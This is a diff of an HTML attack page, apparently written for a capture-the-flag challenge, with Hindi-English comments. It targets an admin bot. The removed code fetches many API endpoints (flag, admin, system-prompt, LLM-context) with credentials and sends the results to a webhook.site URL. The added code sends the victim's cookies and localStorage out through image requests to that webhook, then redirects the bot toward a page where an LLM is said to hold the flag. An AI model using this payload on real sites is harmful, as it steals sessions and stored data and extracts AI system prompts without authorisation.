@@ -3,45 +3,31 @@
 <body>
 <script>
 var w = 'https://webhook.site/3ebc554f-f359-45f5-9b7f-d60cd8539ca8';
+var ctf = 'http://151.115.166.43:18920';
 
-// Bot ke saath CTF API call - same origin isliye credentials bhi jayenge
-var apis = [
-  '/api/drawings',
-  '/api/flag',
-  '/flag',
-  '/admin',
-  '/api/admin',
-  '/api/profile',
-  '/api/bot',
-  '/api/me',
-  '/api/user',
-  '/api/secret',
-  '/api/llm-context',
-  '/api/system-prompt',
-  '/api/config'
-];
+// Bot ko CTF site pe redirect karo with XSS payload in URL
+// Pehle check karo bot ke paas koi drawing saved hai
+// Image tag se CORS bypass hota hai
+function steal(url) {
+  new Image().src = w + '?img=' + encodeURIComponent(url);
+}
 
-apis.forEach(function(ep) {
-  fetch('http://151.115.166.43:17947' + ep, {
-    credentials: 'include',
-    mode: 'cors'
-  })
-  .then(function(r) {
-    return r.text().then(function(text) {
-      fetch(w + '?status=' + r.status + '&ep=' + encodeURIComponent(ep) + '&d=' + encodeURIComponent(text.substring(0, 500)));
-    });
-  })
-  .catch(function(e) {
-    // CORS blocked - try no-cors to at least confirm existence
-    fetch('http://151.115.166.43:17947' + ep, {mode: 'no-cors', credentials: 'include'})
-      .then(function() {
-        fetch(w + '?nocors_ok=' + encodeURIComponent(ep));
-      })
-      .catch(function() {
-        fetch(w + '?blocked=' + encodeURIComponent(ep));
-      });
-  });
-});
+// Bot ko CTF site pe bhejo - uski drawing page pe
+// Drawing ID already pata hai: 07ccc69bc55d83d2
+var drawingId = '07ccc69bc55d83d2';
+
+// Bot ko uski apni drawing page pe redirect karo
+// Wahan LLM hai jo system prompt mein flag rakhta hoga
+setTimeout(function() {
+  window.location = ctf + '/drawing/' + drawingId;
+}, 100);
+
+// Pehle data bhejo
+steal(document.cookie);
+steal(JSON.stringify(localStorage));
+
+// Har ek drawing ka data fetch karo via image (no-cors workaround)
+// Asal mein bot ko ek aisi page pe bhejo jo flag contain kare
 </script>
 </body>
 </html>
